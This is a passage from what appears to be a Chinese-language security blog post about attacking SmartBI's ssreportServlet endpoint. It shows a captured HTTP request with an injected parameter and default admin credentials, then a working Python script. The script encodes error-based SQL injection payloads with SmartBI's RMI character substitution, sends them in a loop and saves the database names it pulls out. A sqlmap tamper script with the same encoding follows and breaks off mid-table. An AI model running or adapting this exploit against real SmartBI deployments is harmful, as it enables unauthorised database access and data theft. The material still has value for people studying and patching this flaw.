class="code"><pre><span class="line">POST &#x2F;vision&#x2F;ssreportServlet HTTP&#x2F;1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;99.0.7113.93 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: https:&#x2F;&#x2F;127.0.0.1&#x2F;vision&#x2F;openresource.jsp?iPad&#x3D;true&amp;refresh&#x3D;true&amp;showtoolbar&#x3D;false&amp;showPath&#x3D;false&amp;resid&#x3D;I40281d81016a8bc28bc20231016aaee007b230ac&amp;_timestamp&#x3D;1610433924926</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 3282</span><br><span class="line">Authorization: Basic YWRtaW46YWRtaW4&#x3D;</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: FQPassword&#x3D;; JSESSIONID&#x3D;4BB550BF10C606619B753D3CE52CD3AB</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">sheetIndex&#x3D;0&amp;resid&#x3D;I40281d81016a8bc28bc20231016aaee007b230ac&amp;clientId&#x3D;Iff8080810176f0c7f0c7544f0176f54eb72c1160&amp;refreshType&#x3D;refresh&amp;paramsInfo&#x3D;%5B%7B%22id%22%3A%22OutputParameter.I40281d81016a8bc28bc20231016aa0be219728b6.%E5%8D%95%E4%BD%8D%E5%90%8D%E7%A7%B0%22%2C%22name%22%3A%22%E5%8D%95%E4%BD%8D%E5%90%8D%E7%A7%B0%22%2C%22alias%22%3A%22%E5%8D%95%E4%BD%8D%E5%90%8D%E7%A7%B0%22%2C%22value%22%3A%22&#39;11111%22%2C%22displayValue%22%3A%22&#39;11111%22%7D%2C%7B%22id%22%3A%22OutputParameter.I40281d81016a8bc28bc20231016aa0be219728b6.%E6%89%80%E5%B1%9E%E6%9C%BA%E6%9E%84%22%2C%22name%22%3A%22%E6%89%80%E5%B1%9E%E6%9C%BA%E6%9E%84%22%2C%22alias%22%3A%22%E6%89%80%E5%B1%9E%E6%9C%BA%E6%9E%84%22%2C%22value%22%3A%22%22%2C%22displayValue%22%3A%22%22%7D%2C%7B%22id%22%3A%22OutputParameter.I40281d81016a8bc28bc20231016aa0be219728b6.%E6%89%80%E5%9C%A8%E7%9C%81%E4%BB%BD%22%2C%22name%22%3A%22%E6%89%80%E5%9C%A8%E7%9C%81%E4%BB%BD%22%2C%22alias%22%3A%22%E6%89%80%E5%9C%A8%E7%9C%81%E4%BB%BD%22%2C%22value%22%3A%22440000%22%2C%22displayValue%22%3A%22%E5%B9%BF%E4%B8%9C%22%7D%2C%7B%22id%22%3A%22OutputParameter.I40281d81016a8bc28bc20231016aa0be219728b6.%E6%89%80%E5%9C%A8%E5%9C%B0%E5%B8%82%22%2C%22name%22%3A%22%E6%89%80%E5%9C%A8%E5%9C%B0%E5%B8%82%22%2C%22alias%22%3A%22%E6%89%80%E5%9C%A8%E5%9C%B0%E5%B8%82%22%2C%22value%22%3A%22%22%2C%22displayValue%22%3A%22%E5%85%A8%E9%83%A8%22%7D%2C%7B%22id%22%3A%22OutputParameter.I40281d81016a8bc28bc20231016aa0be219728b6.%E6%89%80%E5%9C%A8%E5%8C%BA%E5%8E%BF%22%2C%22name%22%3A%22%E6%89%80%E5%9C%A8%E5%8C%BA%E5%8E%BF%22%2C%22alias%22%3A%22%E6%89%80%E5%9C%A8%E5%8C%BA%E5%8E%BF%22%2C%22value%22%3A%22%22%2C%22displayValue%22%3A%22%E5%85%A8%E9%83%A8%22%7D%2C%7B%22id%22%3A%22OutputParameter.I40281d81016a8bc28bc20231016aa0be219728b6.id%22%2C%22name%22%3A%22id%22%2C%22alias%22%3A%22%E6%A3%80%E6%B5%8B%E6%9C%BA%E6%9E%84id%22%2C%22value%22%3A%22%22%2C%22displayValue%22%3A%22%22%7D%2C%7B%22id%22%3A%22OutputParameter.I40281d81016a8bc28bc20231016aa0be219728b6.%E5%A1%AB%E6%8A%A5%E6%97%B6%E9%97%B4%E8%B5%B7%22%2C%22name%22%3A%22%E5%A1%AB%E6%8A%A5%E6%97%B6%E9%97%B4%E8%B5%B7%22%2C%22alias%22%3A%22%E5%A1%AB%E6%8A%A5%E6%97%B6%E9%97%B4%E8%B5%B7%22%2C%22value%22%3A%22%22%2C%22displayValue%22%3A%22%22%7D%2C%7B%22id%22%3A%22OutputParameter.I40281d81016a8bc28bc20231016aa0be219728b6.%E5%A1%AB%E6%8A%A5%E6%97%B6%E9%97%B4%E6%AD%A2%22%2C%22name%22%3A%22%E5%A1%AB%E6%8A%A5%E6%97%B6%E9%97%B4%E6%AD%A2%22%2C%22alias%22%3A%22%E5%A1%AB%E6%8A%A5%E6%97%B6%E9%97%B4%E6%AD%A2%22%2C%22value%22%3A%22%22%2C%22displayValue%22%3A%22%22%7D%2C%7B%22id%22%3A%22OutputParameter.I40281d81016a8bc28bc20231016aa0be219728b6.%E6%9B%B4%E6%96%B0%E6%97%B6%E9%97%B4%E8%B5%B7%22%2C%22name%22%3A%22%E6%9B%B4%E6%96%B0%E6%97%B6%E9%97%B4%E8%B5%B7%22%2C%22alias%22%3A%22%E6%9B%B4%E6%96%B0%E6%97%B6%E9%97%B4%E8%B5%B7%22%2C%22value%22%3A%22%22%2C%22displayValue%22%3A%22%22%7D%2C%7B%22id%22%3A%22OutputParameter.I40281d81016a8bc28bc20231016aa0be219728b6.%E6%9B%B4%E6%96%B0%E6%97%B6%E9%97%B4%E6%AD%A2%22%2C%22name%22%3A%22%E6%9B%B4%E6%96%B0%E6%97%B6%E9%97%B4%E6%AD%A2%22%2C%22alias%22%3A%22%E6%9B%B4%E6%96%B0%E6%97%B6%E9%97%B4%E6%AD%A2%22%2C%22value%22%3A%22%22%2C%22displayValue%22%3A%22%22%7D%5D&amp;pageId&#x3D;0&amp;writeBackData&#x3D;&amp;exportSheetIndexes&#x3D;&amp;exportId&#x3D;&amp;op&#x3D;%7B%22getTotalPages%22%3Atrue%2C%22sheetPageCounts%22%3A%5B1%5D%7D</span><br></pre></td></tr></table></figure><p><a href="http://b0urne.top/2021/01/12/smartBi总结/image-20210112145030005.png"><img src="http://b0urne.top/2021/01/12/smartBi%E6%80%BB%E7%BB%93/image-20210112145030005.png" alt="image-20210112145030005"></a></p><h2 id="py脚本RMI加密后注入"><a href="#py脚本RMI加密后注入" class="headerlink" title="py脚本RMI加密后注入"></a>py脚本RMI加密后注入</h2><p>报错注入demo：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">#coding&#x3D;utf-8</span><br><span class="line">import requests</span><br><span class="line">from urllib.parse import quote,unquote</span><br><span class="line">import re</span><br><span class="line">from requests.packages.urllib3.exceptions import InsecureRequestWarning</span><br><span class="line"></span><br><span class="line">#去除https的warning</span><br><span class="line">requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</span><br><span class="line"></span><br><span class="line">ENCODING_SCHEDULE &#x3D; &#123;</span><br><span class="line">    &quot;0&quot;: &quot;7&quot;, &quot;1&quot;: &quot;1&quot;, &quot;2&quot;: &quot;u&quot;, &quot;3&quot;: &quot;N&quot;, &quot;4&quot;: &quot;K&quot;, &quot;5&quot;: &quot;J&quot;, &quot;6&quot;: &quot;M&quot;, &quot;7&quot;: &quot;9&quot;, &quot;8&quot;: &quot;&#39;&quot;, &quot;9&quot;: &quot;m&quot;, &quot;!&quot;: &quot;P&quot;,</span><br><span class="line">    &quot;%&quot;: &quot;&#x2F;&quot;, &quot;&#39;&quot;: &quot;n&quot;, &quot;(&quot;: &quot;A&quot;, &quot;)&quot;: &quot;E&quot;, &quot;*&quot;: &quot;s&quot;, &quot;+&quot;: &quot;+&quot;, &quot;-&quot;: &quot;f&quot;, &quot;.&quot;: &quot;q&quot;, &quot;A&quot;: &quot;O&quot;, &quot;B&quot;: &quot;V&quot;, &quot;C&quot;: &quot;t&quot;,</span><br><span class="line">    &quot;D&quot;: &quot;T&quot;, &quot;E&quot;: &quot;a&quot;, &quot;F&quot;: &quot;x&quot;, &quot;G&quot;: &quot;H&quot;, &quot;H&quot;: &quot;r&quot;, &quot;I&quot;: &quot;c&quot;, &quot;J&quot;: &quot;v&quot;, &quot;K&quot;: &quot;l&quot;, &quot;L&quot;: &quot;8&quot;, &quot;M&quot;: &quot;F&quot;, &quot;N&quot;: &quot;3&quot;,</span><br><span class="line">    &quot;O&quot;: &quot;o&quot;, &quot;P&quot;: &quot;L&quot;, &quot;Q&quot;: &quot;Y&quot;, &quot;R&quot;: &quot;j&quot;, &quot;S&quot;: &quot;W&quot;, &quot;T&quot;: &quot;*&quot;, &quot;U&quot;: &quot;z&quot;, &quot;V&quot;: &quot;Z&quot;, &quot;W&quot;: &quot;!&quot;, &quot;X&quot;: &quot;B&quot;, &quot;Y&quot;: &quot;)&quot;,</span><br><span class="line">    &quot;Z&quot;: &quot;U&quot;, &quot;a&quot;: &quot;(&quot;, &quot;b&quot;: &quot;~&quot;, &quot;c&quot;: &quot;i&quot;, &quot;d&quot;: &quot;h&quot;, &quot;e&quot;: &quot;p&quot;, &quot;f&quot;: &quot;_&quot;, &quot;g&quot;: &quot;-&quot;, &quot;h&quot;: &quot;I&quot;, &quot;i&quot;: &quot;R&quot;, &quot;j&quot;: &quot;.&quot;,</span><br><span class="line">    &quot;k&quot;: &quot;G&quot;, &quot;l&quot;: &quot;S&quot;, &quot;m&quot;: &quot;d&quot;, &quot;n&quot;: &quot;6&quot;, &quot;o&quot;: &quot;w&quot;, &quot;p&quot;: &quot;5&quot;, &quot;q&quot;: &quot;0&quot;, &quot;r&quot;: &quot;4&quot;, &quot;s&quot;: &quot;D&quot;, &quot;t&quot;: &quot;k&quot;, &quot;u&quot;: &quot;Q&quot;,</span><br><span class="line">    &quot;v&quot;: &quot;g&quot;, &quot;w&quot;: &quot;b&quot;, &quot;x&quot;: &quot;C&quot;, &quot;y&quot;: &quot;2&quot;, &quot;z&quot;: &quot;X&quot;, &quot;~&quot;: &quot;e&quot;, &quot;_&quot;: &quot;y&quot;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DECODING_SCHEDULE &#x3D; &#123;</span><br><span class="line">    &quot;7&quot;: &quot;0&quot;, &quot;1&quot;: &quot;1&quot;, &quot;u&quot;: &quot;2&quot;, &quot;N&quot;: &quot;3&quot;, &quot;K&quot;: &quot;4&quot;, &quot;J&quot;: &quot;5&quot;, &quot;M&quot;: &quot;6&quot;, &quot;9&quot;: &quot;7&quot;, &quot;&#39;&quot;: &quot;8&quot;, &quot;m&quot;: &quot;9&quot;, &quot;P&quot;: &quot;!&quot;,</span><br><span class="line">    &quot;&#x2F;&quot;: &quot;%&quot;, &quot;n&quot;: &quot;&#39;&quot;, &quot;A&quot;: &quot;(&quot;, &quot;E&quot;: &quot;)&quot;, &quot;s&quot;: &quot;*&quot;, &quot;+&quot;: &quot;+&quot;, &quot;f&quot;: &quot;-&quot;, &quot;q&quot;: &quot;.&quot;, &quot;O&quot;: &quot;A&quot;, &quot;V&quot;: &quot;B&quot;, &quot;t&quot;: &quot;C&quot;,</span><br><span class="line">    &quot;T&quot;: &quot;D&quot;, &quot;a&quot;: &quot;E&quot;, &quot;x&quot;: &quot;F&quot;, &quot;H&quot;: &quot;G&quot;, &quot;r&quot;: &quot;H&quot;, &quot;c&quot;: &quot;I&quot;, &quot;v&quot;: &quot;J&quot;, &quot;l&quot;: &quot;K&quot;, &quot;8&quot;: &quot;L&quot;, &quot;F&quot;: &quot;M&quot;, &quot;3&quot;: &quot;N&quot;,</span><br><span class="line">    &quot;o&quot;: &quot;O&quot;, &quot;L&quot;: &quot;P&quot;, &quot;Y&quot;: &quot;Q&quot;, &quot;j&quot;: &quot;R&quot;, &quot;W&quot;: &quot;S&quot;, &quot;*&quot;: &quot;T&quot;, &quot;z&quot;: &quot;U&quot;, &quot;Z&quot;: &quot;V&quot;, &quot;!&quot;: &quot;W&quot;, &quot;B&quot;: &quot;X&quot;, &quot;)&quot;: &quot;Y&quot;,</span><br><span class="line">    &quot;U&quot;: &quot;Z&quot;, &quot;(&quot;: &quot;a&quot;, &quot;~&quot;: &quot;b&quot;, &quot;i&quot;: &quot;c&quot;, &quot;h&quot;: &quot;d&quot;, &quot;p&quot;: &quot;e&quot;, &quot;_&quot;: &quot;f&quot;, &quot;-&quot;: &quot;g&quot;, &quot;I&quot;: &quot;h&quot;, &quot;R&quot;: &quot;i&quot;, &quot;.&quot;: &quot;j&quot;,</span><br><span class="line">    &quot;G&quot;: &quot;k&quot;, &quot;S&quot;: &quot;l&quot;, &quot;d&quot;: &quot;m&quot;, &quot;6&quot;: &quot;n&quot;, &quot;w&quot;: &quot;o&quot;, &quot;5&quot;: &quot;p&quot;, &quot;0&quot;: &quot;q&quot;, &quot;4&quot;: &quot;r&quot;, &quot;D&quot;: &quot;s&quot;, &quot;k&quot;: &quot;t&quot;, &quot;Q&quot;: &quot;u&quot;,</span><br><span class="line">    &quot;g&quot;: &quot;v&quot;, &quot;b&quot;: &quot;w&quot;, &quot;C&quot;: &quot;x&quot;, &quot;2&quot;: &quot;y&quot;, &quot;X&quot;: &quot;z&quot;, &quot;e&quot;: &quot;~&quot;, &quot;y&quot;: &quot;_&quot;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#此函数可以用来加密明文也可以解密服务器返回的密文</span><br><span class="line">def encode(code):</span><br><span class="line">    out &#x3D; &quot;&quot;</span><br><span class="line">    for item in code:</span><br><span class="line">        out &#x3D; out + ENCODING_SCHEDULE.get(item, item)</span><br><span class="line">    return out</span><br><span class="line"></span><br><span class="line">def decode(code):</span><br><span class="line">    out &#x3D; &quot;&quot;</span><br><span class="line">    for item in code:</span><br><span class="line">        out &#x3D; out + DECODING_SCHEDULE.get(item, item)</span><br><span class="line">    return out</span><br><span class="line"></span><br><span class="line">url &#x3D; &quot;https:&#x2F;&#x2F;127.0.0.1&#x2F;vision&#x2F;ssreportServlet&quot;</span><br><span class="line"></span><br><span class="line">headers &#x3D; &#123;&quot;User-Agent&quot;:&quot;Mozilla&#x2F;5.0 (Windows NT 10.0) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;99.0.7113.93 Safari&#x2F;537.36&quot;,</span><br><span class="line">           &quot;Accept-Encoding&quot;:&quot;gzip, deflate&quot;,</span><br><span class="line">           &quot;Content-Type&quot;:&quot;application&#x2F;x-www-form-urlencoded&quot;,</span><br><span class="line">           &quot;Cookie&quot;:&quot;JSESSIONID&#x3D;4BB550BF10C606619B753D3CE52CD3AB&quot;</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">origin1 &#x3D; &#39;&#39;&#39;[&#123;&quot;id&quot;:&quot;OutputParameter.I40281d81016a8bc28bc20231016aa0be219728b6.单位名称&quot;,&quot;name&quot;:&quot;单位名称&quot;,&quot;alias&quot;:&quot;单位名称&quot;,&quot;value&quot;:&quot;&#39;&#39;&#39;</span><br><span class="line">origin2 &#x3D; &#39;&#39;&#39;&quot;,&quot;displayValue&quot;:&quot;&#39;&#39;&#39;</span><br><span class="line">origin3 &#x3D; &#39;&#39;&#39;&quot;&#125;,&#123;&quot;id&quot;:&quot;OutputParameter.I40281d81016a8bc28bc20231016aa0be219728b6.所属机构&quot;,&quot;name&quot;:&quot;所属机构&quot;,&quot;alias&quot;:&quot;所属机构&quot;,&quot;value&quot;:&quot;&quot;,&quot;displayValue&quot;:&quot;&quot;&#125;,&#123;&quot;id&quot;:&quot;OutputParameter.I40281d81016a8bc28bc20231016aa0be219728b6.所在省份&quot;,&quot;name&quot;:&quot;所在省份&quot;,&quot;alias&quot;:&quot;所在省份&quot;,&quot;value&quot;:&quot;440000&quot;,&quot;displayValue&quot;:&quot;广东&quot;&#125;,&#123;&quot;id&quot;:&quot;OutputParameter.I40281d81016a8bc28bc20231016aa0be219728b6.所在地市&quot;,&quot;name&quot;:&quot;所在地市&quot;,&quot;alias&quot;:&quot;所在地市&quot;,&quot;value&quot;:&quot;&quot;,&quot;displayValue&quot;:&quot;全部&quot;&#125;,&#123;&quot;id&quot;:&quot;OutputParameter.I40281d81016a8bc28bc20231016aa0be219728b6.所在区县&quot;,&quot;name&quot;:&quot;所在区县&quot;,&quot;alias&quot;:&quot;所在区县&quot;,&quot;value&quot;:&quot;&quot;,&quot;displayValue&quot;:&quot;全部&quot;&#125;,&#123;&quot;id&quot;:&quot;OutputParameter.I40281d81016a8bc28bc20231016aa0be219728b6.id&quot;,&quot;name&quot;:&quot;id&quot;,&quot;alias&quot;:&quot;检测机构id&quot;,&quot;value&quot;:&quot;&quot;,&quot;displayValue&quot;:&quot;&quot;&#125;,&#123;&quot;id&quot;:&quot;OutputParameter.I40281d81016a8bc28bc20231016aa0be219728b6.填报时间起&quot;,&quot;name&quot;:&quot;填报时间起&quot;,&quot;alias&quot;:&quot;填报时间起&quot;,&quot;value&quot;:&quot;&quot;,&quot;displayValue&quot;:&quot;&quot;&#125;,&#123;&quot;id&quot;:&quot;OutputParameter.I40281d81016a8bc28bc20231016aa0be219728b6.填报时间止&quot;,&quot;name&quot;:&quot;填报时间止&quot;,&quot;alias&quot;:&quot; 填报时间止&quot;,&quot;value&quot;:&quot;&quot;,&quot;displayValue&quot;:&quot;&quot;&#125;,&#123;&quot;id&quot;:&quot;OutputParameter.I40281d81016a8bc28bc20231016aa0be219728b6.更新时间起&quot;,&quot;name&quot;:&quot;更新时间起&quot;,&quot;alias&quot;:&quot;更新时间起&quot;,&quot;value&quot;:&quot;&quot;,&quot;displayValue&quot;:&quot;&quot;&#125;,&#123;&quot;id&quot;:&quot;OutputParameter.I40281d81016a8bc28bc20231016aa0be219728b6.更新时间止&quot;,&quot;name&quot;:&quot;更新时间止&quot;,&quot;alias&quot;:&quot;更新时间止&quot;,&quot;value&quot;:&quot;&quot;,&quot;displayValue&quot;:&quot;&quot;&#125;]&#39;&#39;&#39;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for i in range(1,20):</span><br><span class="line">    payload &#x3D; &quot;%&#39; and extractvalue(1,concat(0x7e,(select schema_name from information_schema.schemata limit &#123;0&#125;,1),0x7e)) and null &#x3D; &#39;%&quot;.format(i)</span><br><span class="line">    # print(payload)</span><br><span class="line">    origin_full &#x3D; origin1 + payload + origin2 + payload + origin3</span><br><span class="line">    # print(origin_full)</span><br><span class="line">    url_encode_full &#x3D; quote(origin_full)</span><br><span class="line">    # print(url_encode_full)</span><br><span class="line">    rmi_encode &#x3D; encode(url_encode_full)</span><br><span class="line">    # print(rmi_encode)</span><br><span class="line">    encode_final &#x3D; &#39;encode&#x3D;&#39;+rmi_encode</span><br><span class="line">    data &#x3D; &#123;</span><br><span class="line">        &quot;resid&quot;:&quot;I40281d81016a8bc28bc20231016aaee007b230ac&quot;,</span><br><span class="line">        &quot;clientId&quot;:&quot;Iff8080810176f0c7f0c7544f0176f54eb72c1160&quot;,</span><br><span class="line">        &quot;refreshType&quot;:&quot;refresh&quot;,</span><br><span class="line">        &quot;paramsInfoEncode&quot;:encode_final</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    #proxies &#x3D; &#123;&#39;http&#39;:&#39;http:&#x2F;&#x2F;127.0.0.1:8080&#39;,&#39;https&#39;:&#39;http:&#x2F;&#x2F;127.0.0.1:8080&#39;&#125;</span><br><span class="line"></span><br><span class="line">    r &#x3D; requests.post(url,data&#x3D;data,headers&#x3D;headers,verify&#x3D;False)</span><br><span class="line">    #print(r.text)</span><br><span class="line">    regex &#x3D; r&quot;~\w+~&quot;</span><br><span class="line">    match &#x3D; re.search(regex,r.text).span() #返回第一个匹配到的结果的位置（1000,1005）</span><br><span class="line">    database &#x3D; r.text[match[0]+1:match[1]-1]</span><br><span class="line">    print(r.text[match[0]:match[1]])</span><br><span class="line"></span><br><span class="line">    with open(&#39;file.txt&#39;,&#39;a+&#39;) as f:</span><br><span class="line">        f.write(database+&#39;\n&#39;)</span><br></pre></td></tr></table></figure><p><a href="http://b0urne.top/2021/01/12/smartBi总结/image-20210112175110646.png"><img src="http://b0urne.top/2021/01/12/smartBi%E6%80%BB%E7%BB%93/image-20210112175110646.png" alt="image-20210112175110646"></a></p><p>在想怎么结合sqlmap写tamper指定位置实现注入，需要修改tamper, 可以实现Payload加密，有时间的话研究一下sqlmap源码可以写一个全加密的tamper</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">#coding&#x3D;utf-8</span><br><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">Copyright (c) 2006-2020 sqlmap developers (http:&#x2F;&#x2F;sqlmap.org&#x2F;)</span><br><span class="line">See the file &#39;LICENSE&#39; for copying permission</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">from lib.core.enums import PRIORITY</span><br><span class="line">from urlparse  import unquote</span><br><span class="line">__priority__ &#x3D; PRIORITY.LOW</span><br><span class="line">ENCODING_SCHEDULE &#x3D; &#123;</span><br><span class="line">    &quot;0&quot;: &quot;7&quot;, &quot;1&quot;: &quot;1&quot;, &quot;2&quot;: &quot;u&quot;, &quot;3&quot;: &quot;N&quot;, &quot;4&quot;: &quot;K&quot;, &quot;5&quot;: &quot;J&quot;, &quot;6&quot;: &quot;M&quot;, &quot;7&quot;: &quot;9&quot;, &quot;8&quot;: &quot;&#39;&quot;, &quot;9&quot;: &quot;m&quot;, &quot;!&quot;: &quot;P&quot;, </span><br><span class="line">    &quot;%&quot;: &quot;&#x2F;&quot;, &quot;&#39;&quot;: &quot;n&quot;, &quot;(&quot;: &quot;A&quot;, &quot;)&quot;: &quot;E&quot;, &quot;*&quot;: &quot;s&quot;, &quot;+&quot;: &quot;+&quot;, &quot;-&quot;: &quot;f&quot;, &quot;.&quot;: &quot;q&quot;, &quot;A&quot;: &quot;O&quot;, &quot;B&quot;: &quot;V&quot;, &quot;C&quot;: &quot;t&quot;, </span><br><span class="line">    &quot;D&quot;: &quot;T&quot;, &quot;E&quot;: &quot;a&quot;, &quot;F&quot;: &quot;x&quot;, &quot;G&quot;: &quot;H&quot;, &quot;H&quot;: &quot;r&quot;, &quot;I&quot;: &quot;c&quot;, &quot;J&quot;: &quot;v&quot;, &quot;K&quot;: &quot;l&quot;, &quot;L&quot;: &quot;8&quot;, &quot;M&quot;: &quot;F&quot;, &quot;N&quot;: &quot;3&quot;, </span><br><span class="line">    &quot;O&quot;: &quot;o&quot;, &quot;P&quot;: &quot;L&quot;, &quot;Q&quot;: &quot;Y&quot;, &quot;R&quot;: &quot;j&quot;, &quot;S&quot;: &quot;W&quot;, &quot;T&quot;: &quot;*&quot;, &quot;U&quot;: &quot;z&quot;, &quot;V&quot;: &quot;Z&quot;, &quot;W&quot;: &quot;!&quot;, &quot;X&quot;: &quot;B&quot;, &quot;Y&quot;: &quot;)&quot;, </span><br><span class="line">    &quot;Z&quot;: &quot;U&quot;, &quot;a&quot;: &quot;(&quot;, &quot;b&quot;: &quot;~&quot;, &quot;c&quot;: &quot;i&quot;, &quot;d&quot;: &quot;h&quot;, &quot;e&quot;: &quot;p&quot;, &quot;f&quot;: &quot;_&quot;, &quot;g&quot;: &quot;-&quot;, &quot;h&quot;: &quot;I&quot;, &quot;i&quot;: &quot;R&quot;, &quot;j&quot;: &quot;.&quot;, </span><br><span class="line">    &quot;k&quot;: &quot;G&quot;, &quot;l&quot;: &quot;S&quot;, &quot;m&quot;: &quot;d&quot;, &quot;n&quot;: &quot;6&quot;, &quot;o&quot;: &quot;w&quot;, &quot;p&quot;: &quot;5&quot;, &quot;q&quot;: &quot;0&quot;, &quot;r&quot;: &quot;4&quot;, &quot;s&quot;: &quot;D&quot;, &quot;t&quot;: &quot;k&quot;, &quot;u&quot;: &quot;Q&quot;, </span><br><span class="line">    &quot;v&quot;: &quot;g&quot;, &quot;w&quot;: &quot;b&quot;, &quot;x&quot;: &quot;C&quot;, &quot;y&quot;: &quot;2&quot;, &quot;z&quot;: &quot;X&quot;, &quot;~&quot;: &quot;e&quot;, &quot;_&quot;: &quot;y&quot;, </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DECODING_SCHEDULE &#x3D; &#123;</span><br><span class="line">    &quot;7&quot;: &quot;0&quot;, &quot;1&quot;: &quot;1&quot;, &quot;u&quot;: &quot;2&quot;, &quot;N&quot;: &quot;3&quot;, &quot;K&quot;: &quot;4&quot;, &quot;J&quot;: &quot;5&quot;, &quot;M&quot;: &quot;6&quot;, &quot;9&quot;: &quot;7&quot;, &quot;&#39;&quot;: &quot;8&quot;, &quot;m&quot;: &quot;9&quot;, &quot;P&quot;: &quot;!&quot;, </span><br><span class="line">    &quot;&#x2F;&quot;: &quot;%&quot;, &quot;n&quot;: &quot;&#39;&quot;, &quot;A&quot;: &quot;(&quot;, &quot;E&quot;: &quot;)&quot;, &quot;s&quot;: &quot;*&quot;, &quot;+&quot;: &quot;+&quot;, &quot;f&quot;: &quot;-&quot;, &quot;q&quot;: &quot;.&quot;, &quot;O&quot;: &quot;A&quot;, &quot;V&quot;: &quot;B&quot;, &quot;t&quot;: &quot;C&quot;, </span><br><span class="line">    &quot;T&quot;: &quot;D&quot;, &quot;a&quot;: &quot;E&quot;, &quot;x&quot;: &quot;F&quot;, &quot;H&quot;: &quot;G&quot;, &quot;r&quot;: &quot;H&quot;, &quot;c&quot;: &quot;I&quot;, &quot;v&quot;: &quot;J&quot;, &quot;l&quot;: &quot;K&quot;, &quot;8&quot;: &quot;L&quot;, &quot;F&quot;: &quot;M&quot;, &quot;3&quot;: &quot;N&quot;, </span><br><span class="line">    &quot;o&quot;: &quot;O&quot;, &quot;L&quot;: &quot;P&quot;, &quot;Y&quot;: &quot;Q&quot;, &quot;j&quot;: &quot;R&quot;, &quot;W&quot;: &quot;S&quot;, &quot;*&quot;: &quot;T&quot;, &quot;z&quot;: &quot;U&quot;, &quot;Z&quot;: &quot;V&quot;, &quot;!&quot;: &quot;W&quot;, &quot;B&quot;: &quot;X&quot;, &quot;)&quot;: &quot;Y&quot;, </span><br><span class="line">    &quot;U&quot;: 